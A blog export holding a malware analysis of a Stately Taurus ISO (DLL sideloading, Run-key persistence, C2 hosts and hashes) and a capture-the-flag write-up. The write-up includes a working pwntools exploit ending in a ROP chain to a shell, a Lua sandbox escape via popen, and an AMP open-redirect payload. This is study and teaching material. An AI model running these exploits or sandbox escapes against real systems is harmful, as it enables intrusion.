[{"content":"Malware Analysis Report: ASEAN Notes.iso from Stately Taurus Campaign Author: Capang Date: 24-01-2025 Analysis Environment: Windows 10 VM Associated Campaign: Stately Taurus ASEAN Notes.iso Ref: https://csirt-cti.net/2024/01/23/stately-taurus-targets-myanmar/ Executive Summary The ASEAN Notes.iso file is a component of a Stately Taurus campaign targeting entities in Myanmar. The attack leverages DLL sideloading via a hijacked Microsoft GetCurrentRollback.exe process (renamed office.exe) to execute the malicious GetCurrentDeploy.dll. The malware establishes persistence through registry modification and attempts C2 communication with fallback infrastructure. Primary objectives include initial access, persistence, and command execution, with suspected espionage motivations.\nCase Details File Metadata File Name ASEAN Notes.iso File Size 602,112 B File Type ISO 9660 MD5 9832bd120aa506758b3c1850dc2f7e41 SHA1 8e7dfe85c00f76c2525b0ea001b735b1240f3342 SHA256 a00673e35eaccf494977f4e9a957d5820a20fe6b589c796f9085a0271e8c380c Created Time N/A File Name GetCurrentDeploy.dll File Size 97,792 B File Type Linker: Microsoft Linker(14.34**)[DLL32] MD5 d901af6c326d9d6934d818beef214e81 SHA1 b78e786091f017510b44137961f3074fe7d5f950 SHA256 51d89afe0a49a3abf88ed6f032e4f0a83949fc44489fc7b45c860020f905c9d7 Created Time 16/1/2024 11:27:46 PM File Name office.exe File Size 73,344 B File Type PE32 MD5 823ce97af76ce9321f8ca58f126b3141 SHA1 aad6f04d8e4a511eb518df3c07a2094c8b558708 SHA256 0d0981941cf9f1021b07b7578c45ed4c623edb16ad03a256c4cd9aaf900d723d Created Time 16/1/2024 11:27:44 PM File Name ASEAN 2024.lnk Mofa memo.lnk MS.lnk NS.lnk File Size 1200 File Type MS Windows shortcut MD5 698382d42978ee9b86046682cacc76ab SHA1 dd149a0c4a650df907557b3c0219fde81d339d11 SHA256 e537c5da268c6a08d6e94d570e8efb17d0ca3f4013e221fadc4e0b3191499767 Created Time N/A Case Specific Requirement Machine Windows Environment Tools hashmyfiles PEStudio DiffView RegShot Wireshark DirWatch Static Analysis ASEAN Notes.iso 34/61 security vendors flagged this file as malicious.\nAssociated with Stately Taurus targeting Myanmar\nWhen mounting the ISO file, the victim is shown a set of LNK files or Shortcut and a folder with numerous structure named _\nAll of the LNK files are programmed to display PDF icon. Each of the LNK / Shortcut has the same properties/command which is\nC:\\Windows\\System32\\ScriptRunner.exe -appvscript _\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\office.exe The _ folder structure:\nAt the end of folder _ there are office.exe and GetCurrentDeploy.dll.\noffice.exe No security vendors flagged this file as malicious. However office.exe is not the real name of this file.\nGetCurrentRollback.exe is the original name and it is a legitmate file associated with Microsoft Corporation. Why does the LNK file execute a legitimate file? DLL-Side Loading is the current assumption that can be made.\nGetCurrentDeploy.dll 49/72 security vendors flagged this file as malicious\n11//77 Windows API being used flaged as malicious\nCan be confirmed that DLL-Side Loading attack is being used. office.exe or GetCurrentRollback.exe might be using a shared library or DLL named GetCurrentDeploy.dll. The nature of importing functions from a shared library is to locate the file in a specific order. For windows this is the searching order:\nThe directory from which the application loaded The system directory The 16-bit system directory The Windows directory The current working directory (CWD) The directories that are listed in the PATH environment variable Knowing the office.exe and GetCurrentDeploy.dll is in the same folder indicates DLL-Side Loading attack is being used.\nreference: https://techzone.bitdefender.com/en/tech-explainers/what-is-dll-sideloading.html\nKey Findings Victim will be tricked into mounting the ISO file and click one of the LNK file The LNK file will execute C:\\Windows\\System32\\ScriptRunner.exe -appvscript _\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\office.exe The file office.exe using GetCurrentDeploy.dll as shared library Malicious code is executed within the context of a legitimate application using DLL Side Loading method Attack Visualization Dynamic Analysis Network Analysis Clicking on one of the LNK files will execute C:\\Windows\\System32\\ScriptRunner.exe -appvscript _\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\office.exe. Right off executing it, the malware will try to communicate with its C2, openservername.com with IP 103.159.132.80.\nDNS request for openservername.com Malware trying to communicate with the C2, but unfortunately the C2 is down.\nUpon multiple failed request, the malware switch into another C2 server with IP 37.120.222.19\nThis C2 is also down. After failed attempts to communicate with the C2 servers, the malware killed itself However upon execution, the malware replicate itself into C:\\Users\\Public\\ directory\nPersistence The malware established a persistence under the registry gameestrto with command line argument StarWegameToyOU at under \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ Key.\nThe Run key makes a program run every time a user logs on.\nExecution Flow LNK Activation: Triggers ScriptRunner.exe to execute office.exe from the nested _ directories.\nDLL Hijacking: office.exe loads GetCurrentDeploy.dll from its directory (DLL search order abuse).\nPersistence: Copies itself to C:\\Users\\Public\\office.exe and adds registry autorun entry.\nC2 Communication:\nPrimary C2: openservername.com (103.159.132.80)\nFallback C2: 37.120.222.19\nSelf-Termination: Exits if C2s are unreachable.\nKey Technical Findings DLL Sideloading Technique:\nLegitimate Process: GetCurrentRollback.exe (Microsoft-signed).\nMalicious DLL: GetCurrentDeploy.dll (unsigned, high entropy sections).\nPersistence Mechanism:\nRegistry: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\gameestrto → \u0026quot;C:\\Users\\Public\\office.exe\u0026quot;. C2 Resilience: Dual C2 infrastructure with failover logic.\nFull Malware Events IOC IOC Type ASEAN Notes.iso (SHA256) a00673e35eaccf494977f4e9a957d5820a20fe6b589c796f9085a0271e8c380c ASEAN 2024.lnk, NS.lnk, MS.lnk, Mofa memo.lnk (SHA256) e537c5da268c6a08d6e94d570e8efb17d0ca3f4013e221fadc4e0b3191499767 office.exe (SHA256) 0d0981941cf9f1021b07b7578c45ed4c623edb16ad03a256c4cd9aaf900d723d GetCurrentDeploy.dll (SHA256) 51d89afe0a49a3abf88ed6f032e4f0a83949fc44489fc7b45c860020f905c9d7 Primary C2 IP address 103.159.132.80 Backup C2 IP address 37.120.222.19 C2 Domain openservername.com Autorun key gameestrto String StarWegameToyOU Reference https://www.spyshelter.com/exe/microsoft-corporation-getcurrentrollback-exe/ https://csirt-cti.net/2024/01/23/stately-taurus-targets-myanmar/ https://techzone.bitdefender.com/en/tech-explainers/what-is-dll-sideloading.html https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys\n","permalink":"http://localhost:1313/posts/asean-notes-iso-stately-taurus/","summary":"\u003ch1 id=\"malware-analysis-report-asean-notesiso-from-stately-taurus-campaign\"\u003eMalware Analysis Report: ASEAN Notes.iso from Stately Taurus Campaign\u003c/h1\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode class=\"language-metadata\" data-lang=\"metadata\"\u003eAuthor: Capang\nDate: 24-01-2025\nAnalysis Environment: Windows 10 VM\nAssociated Campaign: Stately Taurus ASEAN Notes.iso  \nRef: https://csirt-cti.net/2024/01/23/stately-taurus-targets-myanmar/\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"executive-summary\"\u003eExecutive Summary\u003c/h2\u003e\n\u003cp\u003eThe ASEAN Notes.iso file is a component of a Stately Taurus campaign targeting entities in Myanmar. The attack leverages DLL sideloading via a hijacked Microsoft GetCurrentRollback.exe process (renamed office.exe) to execute the malicious GetCurrentDeploy.dll. The malware establishes persistence through registry modification and attempts C2 communication with fallback infrastructure. Primary objectives include initial access, persistence, and command execution, with suspected espionage motivations.\u003c/p\u003e","title":"ASEAN Notes.iso Stately Taurus [Malware Analysis]"},{"content":"ACS2024 Quals Writeup by Teh Tarik Cendol Note: This is a team writeup and improved by Jeremy. Source : Jeremy\u0026rsquo;s Github\nTable of Contents Audit/no-name minor Rev/CS1338: Script Programming Rev/Secure Chat Web/Can You REDIRECT Me Misc/Drone Hijacking Misc/Lutella Misc/Hi Alien Crypto/Secret Encrypt Audit/no-name minor This was a challenge similar to the one I created for Battle of Hackers 2024 so we solved it relatively fast. The challenge provides us with a binary that presents a menu that allows the user to borrow a loan, repay the loan, mining for money, buy a name and change name.\nThe goal is to get a name. But\nTo buy a name, you need to have money. To have money you cannot simply mine, cause it will take a lot of time. So you need to loan and then repay them. The vulnerability lies in the way the program keeps track of the user\u0026rsquo;s loan.\n// Miner struct struct MinerAccount { float cash; float debt_balance; int mining_attempts; char name[0x20]; }; // Loan function void loan(struct MinerAccount *account) { uint32_t amount = 0; printf(\u0026#34;How much loan would you like to request?\\n\u0026#34;); if(scanf(\u0026#34;%d\u0026#34;, \u0026amp;amount) != 1) { printf(\u0026#34;Invalid input\\n\u0026#34;); return; } if(account-\u0026gt;debt_balance + amount \u0026gt; MAX_LOAN) { printf(\u0026#34;Loan limit exceeded\\n\u0026#34;); return; } account-\u0026gt;cash += amount; account-\u0026gt;debt_balance += amount; printf(\u0026#34;Current cash: $%.2f\\n\u0026#34;, account-\u0026gt;cash); printf(\u0026#34;Debt balance: $%.2f\\n\u0026#34;, account-\u0026gt;debt_balance); } The user\u0026rsquo;s loan is defined as a float, which can be subjected to floating point inaccuracy. A float is 32 bit and it has 1 bit for sign, 23 bit for mantissa and 8 bit for exponent. For integers, the inaccuracy starts at 2^24 (16,777,216). In other words, all integers can be represented as floats up to 2^24 but not beyond that. Specifically, in the range of 2^24 to 2^25, float does not support odd numbers, only even numbers.\nProof of Concept Heres a simple C program that demonstrates this\nThis is the output\nExploiting the Program Now, we just need to borrow money until 16777216, buy the name, and borrow loan of size $1 until we eventually are able to repay our loan.\nBuying the name\nAfter borrowing $1\nBuffer Overflow #define MAX_BUF 0x200 struct MinerAccount { float cash; float debt_balance; int mining_attempts; char name[0x20]; }; void change_name(struct MinerAccount *account) { if (has_name_rights != 1) { printf(\u0026#34;You do not have the right to change your name.\\n\u0026#34;); printf(\u0026#34;Please purchase a name to gain the rights to rename your no-name.\\n\u0026#34;); return; } if(account-\u0026gt;debt_balance != 0) { printf(\u0026#34;You still have debts to repay.\\n\u0026#34;); printf(\u0026#34;Pay off your debts to rename your no-name.\\n\u0026#34;); return; } printf(\u0026#34;Enter new name.\\n\u0026#34;); read(0, account-\u0026gt;name, MAX_BUF); printf(\u0026#34;Name updated successfully.\\n\u0026#34;); } int main() { initialize(); srand(time(NULL)); struct MinerAccount account = {0, 0, 0, \u0026#34;no-name\u0026#34;}; while(1) { int choice; printf(\u0026#34;===========================\\n\u0026#34;); printf(\u0026#34;Welcome to %s\\n\u0026#34;, account.name); printf(\u0026#34;Current cash: $%.2f\\n\u0026#34;, account.cash); printf(\u0026#34;Debt balance: $%.2f\\n\u0026#34;, account.debt_balance); printf(\u0026#34;===========================\\n\u0026#34;); printf(\u0026#34;1. Loan\\n2. Repayment\\n3. Mining\\n4. Buy Name\\n5. Change Name\\n6. Exit\\nChoose an action.\\n\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;choice); switch(choice) { case 1: loan(\u0026amp;account); break; case 2: repayment(\u0026amp;account); break; case 3: mining(\u0026amp;account); break; case 4: buy_name(\u0026amp;account); break; case 5: change_name(\u0026amp;account); break; case 6: return 0; default: printf(\u0026#34;Invalid choice\\n\u0026#34;); break; } } return 0; } The name in MinerAccount object was assigned to only 0x20 size, but in change_name function we can change up until 0x200. With the help of the printf() in main, we are able to leak the stack canary and libc address after overwriting enough bytes using read(). Putting it all together, we get\nWe loan 16777216 money Then we buy name so our money no 16777216 - 1337 Then if we loan 1 dollar each time, our cash increase, but debt stays the same. So we loan 1 dollar for 1337 times Then can repay all debt Now start the leaking process through name Leak canary Leak libc_start_main address Proceed will rop chain to system from pwn import * exe = \u0026#39;./prob\u0026#39; elf = context.binary = ELF(exe, checksec = False) io = elf.process() context.log_level = \u0026#39;info\u0026#39; #--------------------------------------------------------------------- sleep(1) #io.recvuntil(b\u0026#39;Choose an action.\\n\u0026#39;) io.sendline(b\u0026#39;1\u0026#39;) #io.recvuntil(b\u0026#39;How much loan would you like to request?\\n\u0026#39;) io.sendline(b\u0026#39;16777216\u0026#39;) #io.recvuntil(b\u0026#39;Choose an action.\\n\u0026#39;) io.sendline(b\u0026#39;4\u0026#39;) for i in range(1337): #\tio.recvuntil(b\u0026#39;Choose an action.\\n\u0026#39;) io.sendline(b\u0026#39;1\u0026#39;) #\tio.recvuntil(b\u0026#39;How much loan would you like to request?\\n\u0026#39;) io.sendline(b\u0026#39;1\u0026#39;) io.recvuntil(b\u0026#39;Choose an action.\\n\u0026#39;) io.sendline(b\u0026#39;2\u0026#39;) io.recvuntil(b\u0026#39;How much would you like to repay?\\n\u0026#39;) io.sendline(b\u0026#39;16777216\u0026#39;) io.recvuntil(b\u0026#39;Choose an action.\u0026#39;) io.sendline(b\u0026#39;5\u0026#39;) io.recvuntil(b\u0026#39;Enter new name.\u0026#39;) io.sendline(b\u0026#39;A\u0026#39;*44) io.recvuntil(b\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\n\u0026#39;) canary = io.recv(7).strip() canary = b\u0026#39;\\x00\u0026#39;+canary canary = unpack(canary) info(f\u0026#39;Canary: {hex(canary)}\u0026#39;) io.recvuntil(b\u0026#39;Choose an action.\u0026#39;) io.sendline(b\u0026#39;5\u0026#39;) io.recvuntil(b\u0026#39;Enter new name.\u0026#39;) io.sendline(b\u0026#39;A\u0026#39;*59) io.recvuntil(b\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\n\u0026#39;) libc_add = unpack(io.recv(6).strip().ljust(8,b\u0026#39;\\x00\u0026#39;)) info(f\u0026#39;libc leaked : {hex(libc_add)}\u0026#39;) io.recvuntil(b\u0026#39;Choose an action.\u0026#39;) io.sendline(b\u0026#39;5\u0026#39;) io.recvuntil(b\u0026#39;Enter new name.\u0026#39;) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) libc.address = libc_add-0x29d90 rop = ROP(libc) rop.system(next(libc.search(b\u0026#39;/bin/sh\\x00\u0026#39;))) payload = b\u0026#39;A\u0026#39;*44 payload += p64(canary) payload += b\u0026#39;A\u0026#39;*8 payload += p64(libc.address + 0x0000000000029cd6) payload += rop.chain() io.sendline(payload) #-------------------------------------------------------------------- io.interactive() @Capang proud of this :D\nRev/CS1338: Script Programming Given the lua file, we know that it shows the source code of the instance and we are required to connect to the instance and send the correct string in order to get the flag. From the source code, we can see that it loads a file named library.\nWe tried online decompiler for lua but failed, so ended up using an open source compiler that we learned from https://www.youtube.com/watch?v=nQR1raNkd2s.\nRev/Secure Chat We are given server.exe, client.exe and OfficeChat.pcapng. The server.exe act as the server for communication, and the client will be acting as the client who start the conversation. This can be seen in the pcap file\nThe high port number is the client. We can verify this by trying to capture loopback address on our system.\nReversing server.exe The communication process of the server\nOpen socket Accept session Generate key Share key with client Start secure conversation Reversing client.exe The communication process of the client\nOpen socket Start a session with server Receive key from server Start secure communication Things that we can take note\nKEY is generated by the server KEY will be shared to the client on network Understanding how the KEY being shared on network Before the key is sent on the network, it is encrypted using XOR with kek variable.\nThis mean, from the given pcap file, we can decrypt the KEY being used by XORing the encrypted key with kek\nDecrypted Key\n0x9e, 0x96, 0xba, 0x9e, 0xf7, 0x36, 0xc8, 0xd8, 0xf7, 0x08, 0x3a, 0xa2, 0xae, 0xc3, 0xfd, 0x35 The secure conversation is being encrypted using the same XOR method. Now we got the key, we just extract the data, then decrypt using our key.\ne6000000 d3f9c8f09e58aff4d7455bd0c5e2dd6cfbf7d2b2d77fe8af92664e82daab8f5aebf1d2be9a59bbacd7675c82daab9858b0b6eef69244ad79587b1acdc0a6dd56ffe5dfbe835ea9acd7665fc7cab0dd53ebe4cef69244e8bb9b6948cbc8aa9e54eaffd5f0db16aaad83284ecacbe38f50ede29af29859a3f8906755c680e3b49431fad6be8744a7ba966a56db8ea5945bfffad3e49216bcb092651ac0d7e3895df7e59aff9142adaa996755cc80e3aa5dffe29aff9559bdacd77155d791e3b55ae93715edd742a0bdd76b56cbcbad8915eef9c8ea9159a4b198285bd7caaa8915f9f9d3f09009 b4000000 c7f3dbf6db1681f884694d82daab9815fbfbdbf79b18e891832849c7cbae8e15f2ffd1fbd741ad7958645682c0a69851bef79afd9843b8b4922855c48eae9850eaffd4f98416bcb7d76f5582c1b59847bee2d2fbd752adac966156d18eb49441f6b6cef69216abb79a7856cbcfad9e50bee2dfff9a18e88f92285ecdc0625241bee1dbf08316bcb7d76553d1dde39c5be7e2d2f79951e8b19a7855d0daa29341bee1d3ea9f16bcb0927b5f82cdab9c5bf9f3c9b0 02010000 d1fe96be835eadf881694fcedafcdd6cfbf7d2b2d77fe8b0966c1ad6c1e38f50edf3cebe9e42e8b4967b4e82d9a6985ebef7dcea9244e8ac9f6d1ad1d7b08950f3b6cfee9357bcbdd92876c7dae39050bee2d2f7995de6f6d92878c7c8ac8f50bedf9af99242e8ac9f694e82c8ac8f15e7f9cfb2d752a1bcd77155d78ea5945bf7e5d2be8553beb1927f53ccc9e3895dfbb6d6f19658e8aa927855d0dae39b47f1fb9aea9f53e8aa92695682cbb08954eaf39afa9246a9aa83655fccdafcdd61f6f3c33f5844adf8806953d6c7ad9a15f1f89af18244e8be926d5ec0cfa09615eaf99aee8559abbd926c1ad5c7b79515ffb6d8f79016bcaa966649c3cdb7945af0b8 c7000000 d9e4dfff831ae8ac9f6954c9ddeddd74f2e4d3f99f42e4f883605f82c0a68a15eef7c9ed8059babcd76e55d08eb79550bee0dbeb9b42e8b1842818e3ed908671aec9f4f1a369bd8bc4576292dc9c9b05ccc9dfd0946491a8c03955ccf1f7b172aee48bca9f7bb5fad92870d7ddb7dd58fffddfbe8443babdd77155d78eb68d51ffe2dfbe8e59bdaad77a5fc1c1b19946bef7d4fad752a7b656a74e82ddab9c47fbb6d3ead741a1ac9f285bccd7ac9350bef3d6ed9216a7ad837b53c6cbe3895dfbb6cefb965be6 1a000000 cef3c8f89255bcf6d75c5bcec5e3895abeefd5ebd745a7b79929 kek = [0x12, 0x9F, 0xE8, 0x31, 0x52, 0xB2, 0x9A, 0x1D, 0xA9, 0xB0, 0x0D, 0x42, 0xD6, 0x3C, 0x77, 0x1E] #16 key =[0x9e, 0x96, 0xba, 0x9e, 0xf7, 0x36, 0xc8, 0xd8, 0xf7, 0x08, 0x3a, 0xa2, 0xae, 0xc3, 0xfd, 0x35] flag = [] secret = [0xd9,0xe4,0xdf,0xff,0x83,0x1a,0xe8,0xac,0x9f,0x69,0x54,0xc9,0xdd,0xed,0xdd,0x74,0xf2,0xe4,0xd3,0xf9,0x9f,0x42,0xe4,0xf8,0x83,0x60,0x5f,0x82,0xc0,0xa6,0x8a,0x15,0xee,0xf7,0xc9,0xed,0x80,0x59,0xba,0xbc,0xd7,0x6e,0x55,0xd0,0x8e,0xb7,0x95,0x50,0xbe,0xe0,0xdb,0xeb,0x9b,0x42,0xe8,0xb1,0x84,0x28,0x18,0xe3,0xed,0x90,0x86,0x71,0xae,0xc9,0xf4,0xf1,0xa3,0x69,0xbd,0x8b,0xc4,0x57,0x62,0x92,0xdc,0x9c,0x9b,0x05,0xcc,0xc9,0xdf,0xd0,0x94,0x64,0x91,0xa8,0xc0,0x39,0x55,0xcc,0xf1,0xf7,0xb1,0x72,0xae,0xe4,0x8b,0xca,0x9f,0x7b,0xb5,0xfa,0xd9,0x28,0x70,0xd7,0xdd,0xb7,0xdd,0x58,0xff,0xfd,0xdf,0xbe,0x84,0x43,0xba,0xbd,0xd7,0x71,0x55,0xd7,0x8e,0xb6,0x8d,0x51,0xff,0xe2,0xdf,0xbe,0x8e,0x59,0xbd,0xaa,0xd7,0x7a,0x5f,0xc1,0xc1,0xb1,0x99,0x46,0xbe,0xf7,0xd4,0xfa,0xd7,0x52,0xa7,0xb6,0x56,0xa7,0x4e,0x82,0xdd,0xab,0x9c,0x47,0xfb,0xb6,0xd3,0xea,0xd7,0x41,0xa1,0xac,0x9f,0x28,0x5b,0xcc,0xd7,0xac,0x93,0x50,0xbe,0xf3,0xd6,0xed,0x92,0x16,0xa7,0xad,0x83,0x7b,0x53,0xc6,0xcb,0xe3,0x89,0x5d,0xfb,0xb6,0xce,0xfb,0x96,0x5b,0xe6] for i in range(len(secret)): enc = secret[i] enc2 = key[i % 16] tmp = enc ^ enc2 flag.append(chr(tmp)) print(\u0026#34;\u0026#34;.join(flag)) Flag : ACS{D0_NoT_uS3_X0r_f0R_eNcRYp71on_4LG0r1ThM}\nWeb/Can You REDIRECT Me We were greeted with a page with almost nothing in it. Except for the provided url parameters: ?url=Report_URL\nLet’s take a deeper look into the source code given and perform code analysis/audit.\napp.js and utils.js seem like the only relevant files for the challenge. Let’s dissect it real quick.\nThe framework of the web app is very similar to the several other web challenges, of which are based on Express (NodeJS) and includes Puppeteer methods in its codebase.\nThere’s nothing really interesting in the utils.js file, except that now we’ve learned the Puppeteer session will be utilizing the goto method, which navigates the headless Chrome browser to the url fed by the user\nRoute Overview:\nThe /report route expects a query parameter url. It checks if the URL\u0026rsquo;s hostname is www.google.com. If the condition fails, it responds with I ONLY trust GOOGLE.\nCritical Checks:\nHostname Check: url.hostname != \u0026#34;www.google.com\u0026#34;. This ensures the hostname is strictly www.google.com. Protocol Check: url.protocol != \u0026#34;http:\u0026#34; \u0026amp;\u0026amp; url.protocol != \u0026#34;https:\u0026#34;. Only http: or https: protocols are allowed. Bot Processing: The bot visits the provided URL. If the final URL\u0026#39;s hostname isn\u0026#39;t www.google.com, the flag is displayed. URLs that don\u0026rsquo;t have the URL protocol; http or https that are being passed onto the parameter will result in the output NOPE!\nThe trick was to pass the hostname validation but somehow make the bot end up on a different hostname. Immediately, I remembered something about Google AMP (Accelerated Mobile Pages). If you hit a URL like this; https://google.com/amp/facebook.com. It passes the hostname check (www.google.com), but when visited, it redirects to facebook.com. Jackpot!\nExecution: Hit the /report endpoint with the payload /report?url=https://www.google.com/amp/facebook.com\nThe server validated the hostname as www.google.com. The bot visited the URL, got redirected by Google AMP to facebook.com. The final check failed because of facebook.com != www.google.com, so the app returned the flag in the JavaScript alert.\nFlag: ACS{It_i5_JU$7_tr1Cky_tRiCK}\nMisc/Drone Hijacking We are given a pcap file with RTP streams. Since it is a drone, we suspect that there might be video streaming. There’s a way to convert RTP to H264 manually in Wireshark according to this forum. H.264 is a video compression standard. The goal is to convert to H264 so that we can view the video. In Edit -\u0026gt; Preferences, set the payload type to 96\nThen, we will see that RTP stream has been converted to H264. We can install Wireshark plugin to extract H.264 stream from the RTP stream.\nHere’s the plugin that I found: https://github.com/volvet/h264extractor/blob/master/rtp_h264_extractor.lua\nJust put into the plugin folder where we install our Wireshark and the plugin will appear in Tools section.\nWe will get .264 file, and we can use ffmpeg to convert it to mp4.\nMisc/Lutella In this challenge, we were tasked with exploiting a Lua-based sandbox environment that had several restrictions, particularly on system calls and sensitive libraries. The goal was to find a way to escape the sandbox and retrieve the flag.\nLua is a lightweight, high-level scripting language commonly embedded in applications to provide extensible scripting capabilities. It is known for its simplicity and flexibility, but in this challenge, we were working with a sandboxed Lua environment, meaning that our access to certain functions and libraries was restricted.\nTypically, a sandbox in Lua might restrict access to the following:\nSystem-level functions like os.execute(), os.popen(), and io.popen(). The debug library, which can be used for introspection and manipulation of Lua\u0026rsquo;s internal state. The ability to interact with the file system.\nIn this environment, we were given limited access to the Lua language but could exploit certain exposed functionalities to break out of the sandbox.\nThe crux of the exploit involved using Lua\u0026rsquo;s debug library and the internal debug.getregistry() function. The sandbox restricted access to system libraries like os and io, but we were able to bypass these restrictions by directly interacting with Lua\u0026rsquo;s internal registry.\nWe start by calling the debug.getregistry() function, which returns a global registry table that Lua uses to manage all objects internally. This registry is usually inaccessible in a sandboxed environment, but it wasn’t properly restricted here. By accessing the registry, we were able to locate internal functions and libraries that were not otherwise exposed.\nWithin the registry, there was an exposed popen function, which allows us to execute system commands. This was a critical vulnerability because it provided a way to interact with the underlying operating system, despite the sandbox restrictions. Normally, Lua’s io.popen or os.popen would be restricted, but by leveraging the registry, we could access and use this function to run shell commands.\nConsidering typical Lua sandbox escape techniques, I first tried to exploit the debug.getregistry() function. The idea was to look for unsafe methods or libraries available in the registry.\ndebug.getregistry().safe_method.popen(\u0026ldquo;cat ./flag\u0026rdquo;):\nHowever, this command failed, as the prompt did not return the flag or any meaningful output.\nAfter further testing, I adjusted the approach and used the print function to display the result explicitly:\nprint(debug.getregistry().safe_method.popen(\u0026#34;cat ./flag\u0026#34;):read(\u0026#34;*a\u0026#34;)) Flag: ACS{Toast_and_chocolate_are_a_fantastic_combination}\nMisc/Hi Alien In the website given, we are allowed to upload a file. However, the challenge also provides us with YARA rules.\nimport \u0026#34;pe\u0026#34; import \u0026#34;math\u0026#34; import \u0026#34;hash\u0026#34; rule acs_rule { meta: description = \u0026#34;ACS\u0026#34; author = \u0026#34;ACS\u0026#34; date = \u0026#34;05/11/2024\u0026#34; version = \u0026#34;1.0\u0026#34; strings: $acs = { 90 90 90 90 68 ?? ?? ?? ?? C3 } condition: uint16(0) == 0x5A4D and math.entropy(0, filesize) \u0026gt; 6 and pe.is_32bit() == 0 and pe.version_info[\u0026#34;CompanyName\u0026#34;] == \u0026#34;acs\u0026#34; and pe.number_of_imported_functions == 62 and pe.imports(\u0026#34;acs.dll\u0026#34;) == 3 and pe.number_of_resources == 1 and pe.number_of_sections == 23 and $acs and $acs in ((pe.sections[pe.section_index(\u0026#34;.acs\u0026#34;)].raw_data_offset) .. (pe.sections[pe.section_index(\u0026#34;.acs\u0026#34;)].raw_data_offset + pe.sections[pe.section_index(\u0026#34;.acs\u0026#34;)].raw_data_size)) and for any section in pe.sections : ( section.name == \u0026#34;.acs\u0026#34; and math.deviation(section.raw_data_offset, section.raw_data_size, math.MEAN_BYTES) \u0026gt; 61.8 and math.deviation(section.raw_data_offset, section.raw_data_size, math.MEAN_BYTES) \u0026lt; 61.9 and $acs at section.raw_data_offset + 0x2f ) or hash.md5(0, filesize) == \u0026#34;33baf1c19ca30dac4617dbab5f375efd\u0026#34; } #include \u0026lt;windows.h\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;cstdlib\u0026gt; #include \u0026lt;ctime\u0026gt; extern \u0026#34;C\u0026#34; __declspec(dllimport) void Function1(); extern \u0026#34;C\u0026#34; __declspec(dllimport) void Function2(); extern \u0026#34;C\u0026#34; __declspec(dllimport) void Function3(); extern \u0026#34;C\u0026#34; __declspec(dllimport) void Function4(); extern \u0026#34;C\u0026#34; __declspec(dllimport) void Function5(); extern \u0026#34;C\u0026#34; __declspec(dllimport) void Function6(); extern \u0026#34;C\u0026#34; __declspec(dllimport) void Function7(); unsigned char randomData[1024 * 14] = { 0x85, 0xF7, 0x2C, 0x6F, 0x75, 0xC2, 0xF7, 0xD0, … (REDACTED) … 0x20, 0x67, 0xE1, 0xE6, 0x62, 0xE9, 0x47, 0x12, }; unsigned char randomData2[1024 * 14] = { 0x1D, 0x8C, 0xD5, 0x61, 0xE1, 0x89, 0x58, 0xD5, … (REDACTED) … 0xF1, 0x0C, 0x00, 0x9F, 0x48, 0x19, 0x45, 0x88, }; int main(){ std::vector\u0026lt;unsigned char\u0026gt; pattern = { 0x90, 0x90, 0x90, 0x90, 0x68, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3 }; Function1(); Function2(); Function3(); Function4(); Function5(); Function6(); Function7(); return 0; }; This is the code which imports exactly 62 functions, with 3 of it being from acs.dll. Then, there are large arrays of random data to pass the entropy check.\n#include \u0026lt;windows.h\u0026gt; 1 VERSIONINFO FILEVERSION 1,0,0,0 PRODUCTVERSION 1,0,0,0 FILEFLAGSMASK 0x3F FILEFLAGS 0x0 FILEOS VOS__WINDOWS32 FILETYPE VFT_APP FILESUBTYPE 0x0 BEGIN BLOCK \u0026#34;StringFileInfo\u0026#34; BEGIN BLOCK \u0026#34;040904E4\u0026#34; // Language and codepage (US English, Unicode) BEGIN VALUE \u0026#34;CompanyName\u0026#34;, \u0026#34;acs\u0026#34; END END BLOCK \u0026#34;VarFileInfo\u0026#34; BEGIN VALUE \u0026#34;Translation\u0026#34;, 0x0409, 1252 END END Version.rc is to be compiled with the cpp file to match pe.version_info[\u0026quot;CompanyName\u0026quot;] == \u0026quot;acs\u0026quot;\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;windows.h\u0026gt; extern \u0026#34;C\u0026#34; __declspec(dllexport) void Function1(); extern \u0026#34;C\u0026#34; __declspec(dllexport) void Function2(); extern \u0026#34;C\u0026#34; __declspec(dllexport) void Function3(); void Function1() { std::cout \u0026lt;\u0026lt; \u0026#34;Function1 from acs.dll called!\u0026#34; \u0026lt;\u0026lt; std::endl; } void Function2() { std::cout \u0026lt;\u0026lt; \u0026#34;Function2 from acs.dll called!\u0026#34; \u0026lt;\u0026lt; std::endl; } void Function3() { std::cout \u0026lt;\u0026lt; \u0026#34;Function3 from acs.dll called!\u0026#34; \u0026lt;\u0026lt; std::endl; } BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { return TRUE; } #include \u0026lt;iostream\u0026gt; #include \u0026lt;windows.h\u0026gt; extern \u0026#34;C\u0026#34; __declspec(dllexport) void Function4(); extern \u0026#34;C\u0026#34; __declspec(dllexport) void Function5(); extern \u0026#34;C\u0026#34; __declspec(dllexport) void Function6(); extern \u0026#34;C\u0026#34; __declspec(dllexport) void Function7(); void Function4() { std::cout \u0026lt;\u0026lt; \u0026#34;Function4 from acs.dll called!\u0026#34; \u0026lt;\u0026lt; std::endl; } void Function5() { std::cout \u0026lt;\u0026lt; \u0026#34;Function5 from acs.dll called!\u0026#34; \u0026lt;\u0026lt; std::endl; } void Function6() { std::cout \u0026lt;\u0026lt; \u0026#34;Function6 from acs.dll called!\u0026#34; \u0026lt;\u0026lt; std::endl; } void Function7() { std::cout \u0026lt;\u0026lt; \u0026#34;Function7 from acs.dll called!\u0026#34; \u0026lt;\u0026lt; std::endl; } BOOL APIENTRY 